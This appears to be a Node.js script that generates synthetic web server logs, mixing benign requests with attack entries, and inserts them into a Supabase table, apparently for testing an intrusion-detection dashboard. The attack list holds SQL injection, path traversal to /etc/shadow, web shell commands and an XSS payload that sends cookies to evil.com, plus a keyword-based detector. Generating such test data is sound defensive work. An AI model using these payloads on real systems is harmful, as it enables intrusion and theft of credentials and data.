import { createClient } from '@supabase/supabase-js'

const SUPABASE_URL = process.env.SUPABASE_URL
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY

if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
  console.error('Missing SUPABASE_URL or SUPABASE_ANON_KEY. Copy .env.example to .env and fill it in.')
  process.exit(1)
}

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY)

const BENIGN_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD']
const BENIGN_URIS = [
  '/api/users', '/api/users/profile', '/api/users/preferences',
  '/api/products', '/api/products/list', '/api/products/search',
  '/api/orders', '/api/orders/history', '/api/cart',
  '/api/login', '/api/logout', '/api/register', '/api/auth/refresh',
  '/home', '/about', '/contact', '/dashboard',
  '/images/logo.png', '/images/banner.jpg', '/favicon.ico',
  '/static/main.js', '/static/styles.css',
  '/api/search?q=shoes', '/api/search?q=laptop',
  '/api/notifications', '/api/settings',
  '/health', '/metrics', '/api/cors',
  '/api/v2/users', '/api/v2/feed',
]
const BENIGN_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36',
  'curl/8.1.2',
  'axios/1.6.0',
  'python-requests/2.31.0',
  'Go-http-client/2.0',
]

const ATTACK_ENTRIES = [
  // SQL injection
  { method: 'GET', uri: "/admin' OR 1=1--", ua: 'Mozilla/5.0' },
  { method: 'GET', uri: "/api/users?id=1 UNION SELECT username,password FROM users--", ua: 'Mozilla/5.0' },
  { method: 'POST', uri: '/api/login', ua: 'sqlmap/1.7.8#stable (https://sqlmap.org)' },
  { method: 'GET', uri: "/api/search?q='; DROP TABLE users;--", ua: 'Mozilla/5.0' },
  { method: 'GET', uri: "/api/products?id=1 AND pg_sleep(5)--", ua: 'Mozilla/5.0' },
  { method: 'GET', uri: "/api/users?name=' OR '1'='1", ua: 'Mozilla/5.0' },
  // XSS
  { method: 'GET', uri: '/?q=<script>alert(1)</script>', ua: 'Mozilla/5.0' },
  { method: 'POST', uri: '/api/comments', ua: 'Mozilla/5.0' },
  { method: 'GET', uri: '/search?term=<img src=x onerror=alert(document.cookie)>', ua: 'Mozilla/5.0' },
  { method: 'GET', uri: '/api/feedback?msg=<svg onload=fetch("https://evil.com/?c="+document.cookie)>', ua: 'Mozilla/5.0' },
  // Path traversal
  { method: 'GET', uri: '/files?path=../../etc/passwd', ua: 'Mozilla/5.0' },
  { method: 'GET', uri: '/download?file=../../../../etc/shadow', ua: 'Mozilla/5.0' },
  { method: 'GET', uri: '/api/file?name=../../../etc/hosts', ua: 'nikto/2.1.6' },
  // Attack tool UAs
  { method: 'GET', uri: '/robots.txt', ua: 'nikto/2.1.6' },
  { method: 'GET', uri: '/wp-admin/admin-ajax.php', ua: 'nikto/2.1.6' },
  { method: 'GET', uri: '/admin', ua: 'sqlmap/1.7.8#stable (https://sqlmap.org)' },
  { method: 'GET', uri: '/.env', ua: 'python-httpx/0.27.0' },
  { method: 'GET', uri: '/api/admin', ua: 'Hydra/9.5 (www.thc.org/thc-hydra)' },
  // Web shells
  { method: 'POST', uri: '/uploads/shell.php?cmd=id', ua: 'curl/7.81.0' },
  { method: 'GET', uri: '/api/exec?cmd=ls -la /etc', ua: 'Mozilla/5.0' },
]

const BENIGN_IPS = Array.from({ length: 30 }, (_, i) => `192.168.1.${i + 10}`)
  .concat(['10.0.0.5', '10.0.0.12', '172.16.0.8', '203.0.113.42', '198.51.100.7'])

const ATTACK_IPS = [
  '45.33.32.156', '195.154.180.45', '89.248.167.131',
  '185.220.101.47', '91.108.4.0', '103.21.244.0',
  '194.165.16.11', '176.58.100.22',
]

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

function generateLog() {
  const isAttack = Math.random() < 0.25

  if (isAttack) {
    const entry = pick(ATTACK_ENTRIES)
    return {
      ip_address: pick(ATTACK_IPS),
      method: entry.method,
      uri: entry.uri,
      status_code: pick([200, 400, 403, 404, 500]),
      bytes: randInt(100, 2000),
      duration_ms: randInt(5, 800),
      user_agent: entry.ua,
      proto: 'tcp',
      service: 'http',
    }
  }

  const method = pick(BENIGN_METHODS)
  const statusOptions = method === 'OPTIONS'
    ? [200, 204]
    : [200, 200, 200, 201, 301, 304, 400, 401, 404]

  return {
    ip_address: pick(BENIGN_IPS),
    method,
    uri: pick(BENIGN_URIS),
    status_code: pick(statusOptions),
    bytes: randInt(200, 50000),
    duration_ms: randInt(2, 300),
    user_agent: pick(BENIGN_UAS),
    proto: 'tcp',
    service: 'http',
  }
}

async function insertLog() {
  const log = generateLog()
  const { error } = await supabase.from('live_logs').insert([log])
  if (error) {
    console.error('[error]', error.message)
    return
  }
  const verdict = log.user_agent.includes('sqlmap') || log.user_agent.includes('nikto') ||
    log.user_agent.includes('Hydra') || log.uri.includes("'") || log.uri.includes('<script') ||
    log.uri.includes('../') || log.uri.includes('exec(') || log.uri.includes('cmd=')
    ? 'ATTACK' : 'benign'
  console.log(`[${verdict}] ${log.method} ${log.uri} — ${log.ip_address} — ${log.status_code} — ${log.duration_ms}ms`)
}

console.log('Log generator started — inserting every 500ms')
setInterval(insertLog, 500)
